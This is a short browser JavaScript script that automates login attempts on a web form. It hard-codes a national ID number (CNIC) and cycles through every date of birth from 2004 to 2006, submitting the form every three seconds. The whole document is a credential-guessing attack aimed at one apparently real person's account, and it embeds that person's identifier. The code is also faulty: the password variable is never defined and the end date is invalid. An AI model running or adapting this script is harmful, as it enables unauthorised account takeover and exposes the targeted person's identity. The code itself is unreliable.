(function () {
  const cnic = "33102-5165298-4";

  const start = new Date("2004-01-01");
  const end = new Date("2006-31-12");
  const delay = 3000; // 3 seconds between attempts

  let current = new Date(start);

  function tryLogin() {
    if (current > end) {
      console.log("✅ All DOBs tried.");
      return;
    }

    const formattedDOB = current.toISOString().split("T")[0];
    console.log("🔄 Trying DOB:", formattedDOB);

    // Fill CNIC
    const cnicField = document.getElementById("userName");
    if (cnicField) {
      cnicField.value = cnic;
      cnicField.dispatchEvent(new Event("input", { bubbles: true }));
      cnicField.dispatchEvent(new Event("change", { bubbles: true }));
    }

    // Fill password
    const passField = document.getElementById("u_password");
    if (passField) {
      passField.value = password;
      passField.dispatchEvent(new Event("input", { bubbles: true }));
      passField.dispatchEvent(new Event("change", { bubbles: true }));
    }

    // Fill DOB
    const dobField = document.querySelector('input[type="date"], #dob');
    if (dobField) {
      dobField.value = formattedDOB;
      dobField.dispatchEvent(new Event("input", { bubbles: true }));
      dobField.dispatchEvent(new Event("change", { bubbles: true }));
    }

    // Submit form
    const loginBtn = document.querySelector('button[type="submit"], input[type="submit"]');
    if (loginBtn) {
      loginBtn.click();
    } else {
      const form = document.querySelector("form");
      if (form) form.submit();
    }

    // Move to next day
    current.setDate(current.getDate() + 1);
    setTimeout(tryLogin, delay);
  }

  tryLogin();
})();
